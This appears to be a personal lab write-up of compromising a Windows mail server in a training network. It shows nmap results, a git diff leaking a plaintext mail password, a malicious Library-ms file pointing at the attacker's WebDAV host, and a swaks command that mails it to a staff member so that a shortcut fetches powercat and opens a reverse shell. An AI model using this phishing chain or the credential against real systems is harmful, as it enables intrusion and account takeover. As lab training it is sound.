# MAIL .189 \[W, Pwned]

## Enumeration

```
Nmap scan report for 192.168.139.189
Host is up (0.091s latency).
Not shown: 57525 closed tcp ports (reset), 7995 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: QUOTA NAMESPACE completed CHILDREN IDLE OK RIGHTS=texkA0001 ACL IMAP4 CAPABILITY IMAP4rev1 SORT
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Files

ms-Library phsishing

### Ports

### Local Users

## Initial Foothold

From LEGACY

```
C:\staging\.git> git show 8b430c17c16e6c0515e49c4eafdd129f719fde74
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server. 
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file

```

### Phishing via ms-Library

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.45.158</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

This will point to a shortcut (.lnk file) that fetches and runs powercat hosted on 8000 with revshell listener at 8001

This file will be hosted at 80 with `/home/jtripz/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/jtripz/webdav/`

```
sudo swaks --to jim@relia.com --from maildmz@relia.com --header 'Subject: Please check this spreadsheet' --header-X-Test "Header" --server 192.168.202.189  --attach @config.Library-ms
```

BRO

When you copy the ms-Library from your VM you pointing to your actual IP not the tun IP lmao that's why it didnt work

## PrivEsc

Login as Domain Admin from FILES

## Post Exploitation

None
